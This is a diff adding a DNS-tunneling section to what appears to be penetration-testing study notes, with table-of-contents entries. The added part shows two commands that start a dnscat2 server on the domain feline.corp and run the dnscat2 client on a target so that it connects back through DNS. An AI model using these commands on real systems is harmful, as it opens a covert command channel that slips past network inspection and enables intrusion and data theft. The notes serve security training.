@@ -72,6 +72,9 @@
   * [Port Forwarding with Linux Tools](#Port-Forwarding-with-Linux-Tools)
   * [SSH Tunneling](#SSH-Tunneling)
   * [Port Forwarding with Windows Tools](#Port-Forwarding-with-Windows-Tools)
+* [Tunneling Through Deep Packet Inspection](#Tunneling-Through-Deep-Packet-Inspection)
+  * [DNS Tunneling Theory and Practice](#DNS-Tunneling-Theory-and-Practice)
+
 
 # Useful
 
@@ -1715,4 +1718,22 @@ C:\Windows\Administrator>
 
 
 
+# Tunneling Through Deep Packet Inspection
+
+## DNS Tunneling Theory and Practice
+
+### DNS Tunneling with dnscat2
+
+#### Starting the dnscat2 server
+
+~~~ bash
+dnscat2-server feline.corp
+~~~
+
+
+#### The dnscat2 client running on target
+
+~~~ bash
+./dnscat feline.corp
+~~~
 
